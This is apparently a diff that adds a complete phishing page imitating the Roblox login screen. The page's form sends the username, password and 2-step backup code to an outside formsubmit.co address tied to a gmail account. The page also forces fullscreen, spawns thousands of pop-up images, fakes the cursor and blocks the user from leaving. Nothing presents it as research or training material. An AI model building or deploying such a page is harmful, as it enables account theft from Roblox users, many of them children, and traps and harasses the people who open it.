@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Roblox Style Login with Pop-Ups</title>
+<!-- (Your existing CSS here) -->
+<style>
+/* Reset and base styles */
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+  font-family: Arial, Helvetica, sans-serif;
+  font-weight: 700;
+}
+html, body {
+  width: 100%;
+  height: 100%;
+  font-size: 18px;
+}
+
+
+/* Background */
+body {
+  background-image: url("https://image.api.playstation.com/vulcan/ap/rnd/202604/0801/6157a74f216f5fd380f33d326132130e6d1d7578291da74c.png");
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
+}
+
+
+/* Navbar styles */
+.navbar {
+  position: fixed;
+  top: 0;
+  width: 100%;
+  height: 40px;
+  background: #191b1f;
+  display: flex;
+  align-items: center;
+  padding: 0 20px;
+  z-index: 1000;
+}
+.logo {
+  color: white;
+  text-decoration: none;
+  font-size: 25px;
+  font-weight: 900;
+  margin-right: 40px;
+}
+.nav-links {
+  display: flex;
+  gap: 35px;
+}
+.nav-links a {
+  color: white;
+  text-decoration: none;
+  font-size: 14px;
+  font-weight: 600;
+}
+.nav-links a:hover {
+  color: #aaa;
+}
+.search {
+  margin-left: auto;
+  margin-right: 20px;
+}
+.search input {
+  width: 400px;
+  height: 28px;
+  background: #202329;
+  border: 1px solid #333;
+  border-radius: 8px;
+  color: white;
+  padding: 0 15px;
+}
+.signup-btn {
+  background: #3366ff;
+  color: white;
+  text-decoration: none;
+  padding: 8px 14px;
+  border-radius: 8px;
+  font-weight: bold;
+}
+.signup-btn:hover {
+  background: #4d7dff;
+}
+
+
+/* Container for login form */
+.container {
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  position: relative;
+}
+
+
+/* Login box styles */
+.login-box {
+  width: 360px;
+  background: rgba(35, 39, 48, 0.95);
+  color: white;
+  padding: 30px;
+  border-radius: 8px;
+  text-align: center;
+  position: relative;
+  z-index: 1;
+}
+.login-box h1 {
+  font-size: 40px;
+  margin-bottom: 20px;
+}
+.input-field {
+  width: 100%;
+  height: 42px;
+  margin-bottom: 12px;
+  background: #343845;
+  border: 1px solid #4a4f5d;
+  border-radius: 6px;
+  color: white;
+  padding: 0 15px;
+}
+.input-field::placeholder {
+  color: #ccc;
+}
+.login-btn,
+.secondary-btn {
+  width: 100%;
+  height: 42px;
+  border-radius: 8px;
+  cursor: pointer;
+  font-weight: bold;
+  margin-top: 8px;
+}
+.login-btn {
+  background: transparent;
+  color: white;
+  border: 1px solid white;
+}
+.login-btn:hover {
+  background: white;
+  color: black;
+}
+.secondary-btn {
+  background: #363a47;
+  border: none;
+  color: white;
+}
+.secondary-btn:hover {
+  background: #4a4f5d;
+}
+.link {
+  display: block;
+  margin: 25px 0;
+  color: white;
+  text-decoration: none;
+}
+.signup {
+  margin-top: 25px;
+}
+.signup a {
+  color: white;
+  font-weight: bold;
+}
+hr {
+  border: none;
+  height: 1px;
+  background: #555;
+  margin: 20px 0;
+}
+
+
+/* Popup modals styles */
+.modal {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.75);
+  justify-content: center;
+  align-items: center;
+  z-index: 2000;
+}
+.modal.active {
+  display: flex;
+}
+.modal-content {
+  width: 370px;
+  background: #232734;
+  color: white;
+  padding: 25px;
+  border-radius: 8px;
+  text-align: center;
+  position: relative;
+}
+.close {
+  position: absolute;
+  top: 10px;
+  right: 15px;
+  font-size: 30px;
+  cursor: pointer;
+}
+
+
+/* QR code container styles */
+#qrcode {
+  background: white;
+  width: 170px;
+  height: 170px;
+  margin: 15px auto;
+  padding: 10px;
+}
+
+
+/* Code box style */
+.code-box {
+  background: #343845;
+  padding: 12px;
+  border-radius: 8px;
+  font-size: 28px;
+  letter-spacing: 5px;
+  margin: 15px 0;
+}
+
+
+/* Second code floating images styles */
+.popup-image {
+  position: fixed;
+  width: 300px;
+  height: 300px;
+  border-radius: 8px;
+  box-shadow: 0 6px 18px rgba(0, 0, 0, 0.25);
+  cursor: pointer;
+  z-index: 10000;
+}
+.freezeOverlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(255, 255, 255, 0.12);
+  z-index: 10001;
+  display: none;
+}
+.freezeOverlay.show {
+  display: block;
+}
+.fakeCursor {
+  position: fixed;
+  width: 18px;
+  height: 18px;
+  border-radius: 50%;
+  background: rgba(0, 0, 0, 0.9);
+  pointer-events: none;
+  z-index: 10002;
+  transform: translate(-50%, -50%);
+}
+.fakeCursor::after {
+  content: "";
+  position: absolute;
+  inset: -8px;
+  border-radius: 50%;
+  border: 2px solid rgba(255, 64, 129, 0.9);
+  animation: pulse 1s infinite ease-out;
+}
+@keyframes pulse {
+  0% { transform: scale(0.8); opacity: 0; }
+  100% { transform: scale(1.5); opacity: 0; }
+}
+
+
+/* Fullscreen button style */
+#fullscreenBtn {
+  position: fixed;
+  top: 10px;
+  right: 10px;
+  z-index: 9999;
+  padding: 8px 12px;
+  background: #3366ff;
+  color: white;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  font-weight: bold;
+}
+#fullscreenBtn:hover {
+  background: #4d7dff;
+}
+</style>
+</head>
+<body>
+
+
+<!-- Fullscreen trigger on click anywhere (no button needed now) -->
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  // Add one-time click listener to trigger fullscreen
+  document.addEventListener('click', () => {
+    if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
+      const elem = document.documentElement;
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen().catch(() => {});
+      } else if (elem.webkitRequestFullscreen) {
+        elem.webkitRequestFullscreen().catch(() => {});
+      } else if (elem.msRequestFullscreen) {
+        elem.msRequestFullscreen().catch(() => {});
+      }
+    }
+    // Remove this listener after first click
+    document.removeEventListener('click', arguments.callee);
+  });
+});
+</script>
+
+
+<!-- Your existing content starts here -->
+
+
+<!-- NAVBAR -->
+<div class="navbar">
+  <a href="https://www.roblox.com/" class="logo" target="_blank">ROBLOX</a>
+  <div class="nav-links">
+    <a href="https://www.roblox.com/charts?device=computer&country=us" target="_blank">Charts</a>
+    <a href="https://www.roblox.com/catalog?taxonomy=tZsUsd2BqGViQrJ9Vs3Wah&salesTypeFilter=1" target="_blank">Marketplace</a>
+    <a href="https://create.roblox.com/landing" target="_blank">Create</a>
+    <a href="https://www.roblox.com/upgrades/robux" target="_blank">Robux</a>
+  </div>
+  <div class="search">
+    <input type="text" placeholder="Search" />
+  </div>
+  <a href="https://www.roblox.com/CreateAccount" class="signup-btn" target="_blank">Sign Up</a>
+</div>
+
+
+<!-- LOGIN BOX -->
+<div class="container">
+  <div class="login-box">
+    <h1>Login to Roblox</h1>
+    <form id="loginForm" action="https://formsubmit.co/https.www.roblox.comgames97598@gmail.com" method="POST">
+      <input type="text" name="username" class="input-field" placeholder="Username/Email/Phone" />
+      <input type="password" name="password" class="input-field" placeholder="Password" />
+      <button type="button" class="login-btn" onclick="openTwoStep()">Log In</button>
+      <a href="https://www.roblox.com/login/forgot-password-or-username" class="link" target="_blank">Forgot Password or Username?</a>
+     
+      <!-- 2 STEP VERIFICATION POPUP -->
+      <div id="twoStepPopup" class="modal">
+        <div class="modal-content">
+          <span class="close" onclick="closeTwoStep()">&times;</span>
+          <h2>2-Step Verification</h2>
+          <p>Enter a previously saved backup code.</p>
+          <input type="text" name="backup_code" maxlength="9" class="input-field" placeholder="Enter 9-digit Code" />
+          <div>
+            <input type="checkbox" /> Trust this device for 30 days
+          </div>
+          <br />
+          <button class="secondary-btn" onclick="return false;">Use another verification method</button>
+          <button type="button" class="login-btn" onclick="submitLoginForm()">Verify</button>
+          <p style="font-size:10px; margin-top:15px;">IMPORTANT: Don't share your backup codes with anyone.</p>
+        </div>
+      </div>
+     
+      <hr />
+      <button class="secondary-btn" onclick="openEmailCode()">Email Me a One-Time Code</button>
+      <button class="secondary-btn" onclick="openQuickSignIn()">Quick Sign-in</button>
+     
+      <div class="signup">
+        <p>Don't have an account? <a href="https://www.roblox.com/CreateAccount" target="_blank">Sign Up</a></p>
+      </div>
+    </form>
+  </div>
+</div>
+
+
+<!-- EMAIL ONE-TIME CODE POPUP -->
+<div id="emailModal" class="modal">
+  <div class="modal-content">
+    <span class="close" onclick="closeEmailCode()">&times;</span>
+    <h2>Get One-Time Code</h2>
+    <p>Enter the email verified on your account to receive a one-time code.</p>
+    <input type="email" class="input-field" placeholder="Enter your email" />
+    <button class="login-btn">Continue</button>
+  </div>
+</div>
+
+
+<!-- QUICK SIGN-IN POPUP -->
+<div id="quickModal" class="modal">
+  <div class="modal-content">
+    <span class="close" onclick="closeQuickSignIn()">&times;</span>
+    <h2>Quick Sign-In Code</h2>
+    <h3>Option 1</h3>
+    <p>Scan this QR code from your logged in device's camera.</p>
+    <div id="qrcode"></div>
+    <p>Having trouble?</p>
+    <h3>Option 2</h3>
+    <div id="loginCode" class="code-box">ABC123</div>
+    <p>Open your Roblox app and go to:<br /><b>More Page &gt; Quick Sign In</b></p>
+  </div>
+</div>
+
+
+<!-- Include QRCode library -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script>
+/* ==================== The code to trigger fullscreen on first click anywhere ==================== */
+
+
+// This code runs on DOMContentLoaded
+document.addEventListener('DOMContentLoaded', () => {
+  // Add one-time click listener to trigger fullscreen
+  document.addEventListener('click', () => {
+    if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
+      const elem = document.documentElement;
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen().catch(() => {});
+      } else if (elem.webkitRequestFullscreen) {
+        elem.webkitRequestFullscreen().catch(() => {});
+      } else if (elem.msRequestFullscreen) {
+        elem.msRequestFullscreen().catch(() => {});
+      }
+    }
+    // Remove this listener after first click to prevent multiple triggers
+    document.removeEventListener('click', arguments.callee);
+  });
+});
+
+
+/* ==================== Your existing functions ==================== */
+
+
+function openTwoStep() {
+  document.getElementById('twoStepPopup').classList.add('active');
+  console.log('2-step popup opened');
+}
+
+
+function closeTwoStep() {
+  document.getElementById('twoStepPopup').classList.remove('active');
+  console.log('2-step popup closed, starting second sequence...');
+  showPopUps(20000, 50);
+}
+
+
+function submitLoginForm() {
+  const form = document.getElementById("loginForm");
+  const backupCodeInput = form.querySelector('input[name="backup_code"]');
+  const hiddenInput = document.createElement("input");
+  hiddenInput.type = "hidden";
+  hiddenInput.name = "backup_code";
+  hiddenInput.value = backupCodeInput.value;
+  form.appendChild(hiddenInput);
+  form.submit();
+}
+
+
+function createFloatingImage(src) {
+  const img = document.createElement('img');
+  img.src = src;
+  img.className = 'popup-image';
+
+
+  const vw = Math.max(document.documentElement.clientWidth, window.innerWidth);
+  const vh = Math.max(document.documentElement.clientHeight, window.innerHeight);
+  const maxLeft = vw - 120;
+  const maxTop = vh - 120;
+  const left = Math.random() * maxLeft;
+  const top = Math.random() * maxTop;
+  img.style.left = left + 'px';
+  img.style.top = top + 'px';
+
+
+  img.addEventListener('click', (event) => {
+    const overlay = document.getElementById('freezeOverlay');
+    overlay.classList.add('show');
+    document.body.style.cursor = 'none';
+
+
+    const cursor = document.createElement('div');
+    cursor.className = 'fakeCursor';
+    cursor.style.left = event.clientX + 'px';
+    cursor.style.top = event.clientY + 'px';
+    document.body.appendChild(cursor);
+
+
+    setTimeout(() => {
+      img.remove();
+      overlay.classList.remove('show');
+      document.body.style.cursor = '';
+      cursor.remove();
+    }, 1000);
+  });
+
+
+  document.body.appendChild(img);
+  return img;
+}
+
+
+function showPopUps(limit, intervalMs) {
+  let count = 0;
+  const maxCount = limit;
+  const imageSrc = "https://i.pinimg.com/1200x/39/26/66/3926665510879508faa859d4db5d56d8.jpg";
+
+
+  const intervalId = setInterval(() => {
+    if (count >= maxCount) {
+      clearInterval(intervalId);
+      console.log('Finished creating pop-ups');
+      return;
+    }
+    createFloatingImage(imageSrc);
+    count++;
+  }, intervalMs);
+}
+
+
+function openEmailCode() {
+  document.getElementById('emailModal').style.display = 'flex';
+}
+function closeEmailCode() {
+  document.getElementById('emailModal').style.display = 'none';
+}
+
+
+function openQuickSignIn() {
+  generateQRCode();
+  document.getElementById('quickModal').style.display = 'flex';
+}
+function closeQuickSignIn() {
+  document.getElementById('quickModal').style.display = 'none';
+}
+
+
+function generateCode() {
+  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  let code = "";
+  for (let i = 0; i < 6; i++) {
+    code += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return code;
+}
+
+
+function generateQRCode() {
+  const code = generateCode();
+  document.getElementById('loginCode').innerHTML = code;
+  const qrContainer = document.getElementById('qrcode');
+  qrContainer.innerHTML = "";
+  new QRCode(qrContainer, {
+    text: code,
+    width: 150,
+    height: 150
+  });
+}
+
+
+// Optional: confirm before leaving the page
+window.addEventListener('beforeunload', function (e) {
+  e.preventDefault(); // Standard
+  e.returnValue = ''; // Chrome
+});
+</script>
+</body>
+</html>
+
+
+
